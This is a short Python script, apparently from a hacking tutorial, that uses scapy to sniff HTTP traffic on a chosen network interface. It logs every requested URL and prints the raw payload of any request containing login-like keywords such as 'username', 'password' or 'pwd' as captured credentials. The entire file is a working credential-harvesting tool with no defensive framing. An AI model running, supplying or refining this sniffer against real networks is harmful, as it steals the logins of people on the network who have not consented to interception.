#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host, 'utf-8') + str(packet[http.HTTPRequest].Path, 'utf-8')

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [b'username', b'uname', b'userid', b'login', b'password', b'pass', b'pwd']
        for keyword in keywords:
            if keyword in load:
                return str(load, 'utf-8')

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request >> ' + url)

        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible Username/Password > ' + login_info + '\n\n')

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface', dest='interface', help='Network Interface')
argument = parser.parse_args()
print(argument.interface)
sniff(argument.interface)
